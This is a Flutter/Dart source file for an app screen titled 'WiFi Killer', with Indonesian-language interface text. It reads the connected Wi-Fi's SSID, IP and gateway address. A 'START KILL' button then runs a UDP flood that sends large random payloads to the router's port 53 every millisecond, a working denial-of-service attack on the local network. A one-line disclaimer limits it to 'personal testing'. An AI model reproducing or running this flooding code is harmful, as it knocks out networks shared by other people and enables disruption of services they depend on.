import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String frequency = "-"; 
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;

  // --- Theme Colors (Glowing Silver) ---
  static const Color primaryColor = Color(0xFFE0E0E0); // Silver/Abu-abu Menyala
  static const Color backgroundColor = Color(0xFF050505); // Hitam Pekat
  static const Color cardColor = Color(0xFF1A1A1A); // Abu-abu Gelap

  @override
  void initState() {
    super.initState();
    _loadWifiInfo();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();

    // Request location permission
    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _showAlert("Permission Denied", "Akses lokasi diperlukan untuk membaca info WiFi.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-"; 
      });

      print("Router IP: $routerIp");
    } catch (e) {
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
      });
    }
  }

  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("❌ Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() => isKilling = true);
    _showAlert("✅ Started", "WiFi Killer!\nStop Manually.");

    const targetPort = 53;
    final List<int> payload = List<int>.generate(65495, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(const Duration(milliseconds: 1), (_) async {
      try {
        for (int i = 0; i < 2; i++) {
          final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
          }
          socket.close();
        }
      } catch (_) {}
    });
  }

  void _stopFlood() {
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
    _showAlert("🛑 Stopped", "WiFi flood attack dihentikan.");
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardColor,
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20),
            side: BorderSide(color: primaryColor.withOpacity(0.3))
        ),
        title: Text(title,
            style: const TextStyle(
              color: primaryColor,
              fontSize: 18,
              fontWeight: FontWeight.bold,
              fontFamily: 'Orbitron',
              shadows: [Shadow(color: primaryColor, blurRadius: 2)],
            )),
        content: Text(message,
            style: const TextStyle(
              color: Colors.white70,
              fontSize: 16,
              fontFamily: 'ShareTechMono',
            )),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("OK", style: TextStyle(color: primaryColor)),
          ),
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Text("$label: ", style: TextStyle(color: primaryColor.withOpacity(0.7), fontWeight: FontWeight.bold)),
          Expanded(child: Text(value, style: const TextStyle(color: primaryColor))),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _stopFlood();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: backgroundColor,
      appBar: AppBar(
        backgroundColor: backgroundColor,
        iconTheme: const IconThemeData(color: primaryColor),
        title: const Text("📡 WiFi Killer", style: TextStyle(fontFamily: 'Orbitron', color: primaryColor, fontWeight: FontWeight.bold)),
      ),
      body: Padding(
        padding: const EdgeInsets.all(25),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              "WiFi Killer",
              style: TextStyle(
                color: primaryColor,
                fontSize: 22,
                fontWeight: FontWeight.bold,
                fontFamily: 'Orbitron',
                shadows: [Shadow(color: primaryColor, blurRadius: 5)],
              ),
            ),
            const SizedBox(height: 10),
            const Text(
              "Feature ini mampu mematikan jaringan WiFi yang anda sambung.\n⚠️ Gunakan hanya untuk testing pribadi. Risiko ditanggung pengguna.",
              style: TextStyle(color: Colors.grey, fontSize: 14),
            ),
            const SizedBox(height: 20),
            Container(
              decoration: BoxDecoration(
                color: cardColor,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: primaryColor.withOpacity(0.2)),
                boxShadow: [
                  BoxShadow(
                    color: primaryColor.withOpacity(0.05),
                    blurRadius: 10,
                    spreadRadius: 1,
                  )
                ],
              ),
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _infoRow("SSID", ssid),
                  _infoRow("IP", ip),
                  _infoRow("Freq", "$frequency MHz"),
                  _infoRow("Router", routerIp),
                ],
              ),
            ),
            const SizedBox(height: 40),
            Center(
              child: ElevatedButton.icon(
                onPressed: isKilling ? _stopFlood : _startFlood,
                style: ElevatedButton.styleFrom(
                  backgroundColor: isKilling ? Colors.grey.shade800 : primaryColor,
                  foregroundColor: isKilling ? Colors.white : Colors.black,
                  padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 15),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(25)),
                  elevation: 5,
                  shadowColor: primaryColor.withOpacity(0.4),
                ),
                icon: Icon(isKilling ? Icons.stop : Icons.wifi_off),
                label: Text(
                  isKilling ? "STOP" : "START KILL",
                  style: const TextStyle(fontSize: 16, letterSpacing: 2, fontFamily: 'Orbitron', fontWeight: FontWeight.bold),
                ),
              ),
            ),
            const SizedBox(height: 20),
            if (isKilling)
              const Center(
                child: CircularProgressIndicator(color: primaryColor),
              ),
          ],
        ),
      ),
    );
  }
}